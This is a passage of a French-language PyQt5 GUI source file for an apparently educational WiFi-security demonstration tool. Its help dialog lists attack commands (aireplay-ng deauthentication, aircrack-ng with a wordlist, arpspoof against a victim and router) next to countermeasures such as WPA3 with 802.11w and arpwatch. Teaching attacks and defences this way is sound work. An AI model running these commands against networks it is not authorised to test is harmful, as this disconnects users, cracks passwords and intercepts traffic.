                border: 1px solid {color};
                color: {color};
                border-radius: 4px;
                padding: 2px 10px;
                font-size: 11px;
            }}
            QPushButton:hover {{ background: {color}; color: white; }}
            QPushButton:checked {{ background: {color}; color: white; font-weight: bold; }}
        """)
        return b

    def _on_nav(self, idx):
        self.stack.setCurrentIndex(idx)
        self._update_bottom_btns(idx)
        labels = ["Scanner", "Lancer", "Lancer", "Générer PDF"]
        self.btn_lancer.setText(labels[idx])

    def _update_bottom_btns(self, idx):
        # Cacher tout
        for b in self._scanner_btns:
            b.setVisible(False)
        self.att_sub_combo.setVisible(False)
        self.def_sub_combo.setVisible(False)
        self.btn_gen_conf.setVisible(False)
        self.btn_pdf.setVisible(False)

        if idx == 0:   # Scanner
            for b in self._scanner_btns: b.setVisible(True)
        elif idx == 1: # Attaques
            self.att_sub_combo.setVisible(True)
        elif idx == 2: # Défenses
            self.def_sub_combo.setVisible(True)
            self.btn_gen_conf.setVisible(True)
        elif idx == 3: # Bilan
            self.btn_pdf.setVisible(True)

    def _att_page(self, idx):
        self.tab_attaques.show_page(idx)

    def _def_page(self, idx):
        self.tab_defenses.show_page(idx)

    def _lancer(self):
        idx = self.stack.currentIndex()
        if idx == 0:   self.tab_scanner.scan_nmcli()
        elif idx == 1: self.tab_attaques.lancer()
        elif idx == 2: self.tab_defenses.lancer()
        elif idx == 3: self.tab_bilan.gen_pdf()

    def _arreter(self):
        idx = self.stack.currentIndex()
        if idx == 0:   self.tab_scanner.stop_scan()
        elif idx == 1: self.tab_attaques.stop_attack()
        elif idx == 2: self.tab_defenses.stop_defense()

    def open_help(self):
        dlg = QDialog(self,
                      Qt.Window | Qt.WindowTitleHint | Qt.WindowSystemMenuHint |
                      Qt.WindowMinimizeButtonHint | Qt.WindowMaximizeButtonHint |
                      Qt.WindowCloseButtonHint)
        dlg.setWindowTitle("Aide – Sécurité réseau WiFi")
        dlg.resize(780, 660)
        dlg.setStyleSheet(stylesheet())
        lay = QVBoxLayout(dlg)
        lay.setContentsMargins(16, 16, 16, 16)

        title = QLabel("GUIDE – SÉCURITÉ RÉSEAU WIFI")
        title.setStyleSheet(f"font-size:15px; font-weight:bold; color:{COLORS['accent']};")
        lay.addWidget(title)

        content = QTextEdit()
        content.setReadOnly(True)
        content.setStyleSheet(
            f"background:#0d1117; color:{COLORS['text']}; font-family:'Segoe UI';"
            f"font-size:12px; border:1px solid {COLORS['border']}; border-radius:6px; padding:12px;"
        )
        content.setHtml(f"""
<style>
  h2 {{ color:{COLORS['accent']}; font-size:13px; margin-top:12px; }}
  h3 {{ color:{COLORS['orange']}; font-size:11px; margin-top:8px; }}
  table {{ border-collapse:collapse; width:100%; margin:6px 0; }}
  td,th {{ border:1px solid #30363d; padding:4px 8px; font-size:11px; }}
  th {{ background:#1e3a5f; color:{COLORS['accent']}; }}
  tr:nth-child(even) {{ background:#161b22; }}
  .code {{ font-family:Consolas; background:#161b22; color:#3fb950;
           padding:2px 6px; border-radius:3px; font-size:10px; }}
  .danger {{ color:{COLORS['danger']}; font-weight:bold; }}
  .ok {{ color:{COLORS['success']}; font-weight:bold; }}
</style>

<h2>But de l'application</h2>
<p>Démontrer les attaques WiFi réelles et valider les contre-mesures
pour répondre au Sujet 3 : <b>Sécurité d'un réseau WiFi</b>.</p>

<h2>📡 Onglet Scanner WiFi</h2>
<table>
<tr><th>Étape</th><th>Commande</th><th>But</th></tr>
<tr><td>1. Mode moniteur</td><td><span class="code">airmon-ng start wlan0</span></td><td>Écoute passive</td></tr>
<tr><td>2. Scanner réseaux</td><td><span class="code">airodump-ng wlan0mon</span></td><td>Détecter SSID/BSSID/chiffrement</td></tr>
</table>

<h2>Onglet Attaques</h2>
<table>
<tr><th>Attaque</th><th>Commande</th><th>Effet</th></tr>
<tr><td>Deauth</td><td><span class="code">aireplay-ng --deauth</span></td><td class="danger">Déconnexion forcée</td></tr>
<tr><td>WPA Crack</td><td><span class="code">aircrack-ng -w rockyou.txt</span></td><td class="danger">Mot de passe cassé</td></tr>
<tr><td>ARP Poisoning</td><td><span class="code">arpspoof -t victime routeur</span></td><td class="danger">Trafic intercepté</td></tr>
</table>

<h2>Onglet Défenses</h2>
<table>
<tr><th>Contre-mesure</th><th>Outil</th><th>Effet</th></tr>
<tr><td>WPA3 + 802.11w</td><td><span class="code">hostapd (ieee80211w=2)</span></td><td class="ok">Deauth bloqué</td></tr>
<tr><td>Mot de passe fort</td><td>Politique interne</td><td class="ok">Crack impossible</td></tr>
<tr><td>arpwatch</td><td><span class="code">arpwatch -i wlan0</span></td><td class="ok">MiM détecté</td></tr>
<tr><td>tshark / Wireshark</td><td><span class="code">tshark -i wlan0</span></td><td class="ok">Trafic analysé</td></tr>
</table>

<h2>Onglet Bilan & PDF</h2>
<p>Génère un rapport PDF complet avec :
architecture, attaques, contre-mesures, comparaison protocoles (WEP/WPA/WPA2/WPA3), conclusion.</p>
<p>Fichier enregistré dans : <span class="code">~/CyberSec_Rapports/</span></p>
""")
        lay.addWidget(content, stretch=1)
        QPushButton("Fermer").clicked  # placeholder
        btn = QPushButton("Fermer")
        btn.clicked.connect(dlg.close)
        lay.addWidget(btn)
        dlg.exec_()


def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = MainWindow()
    win.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()
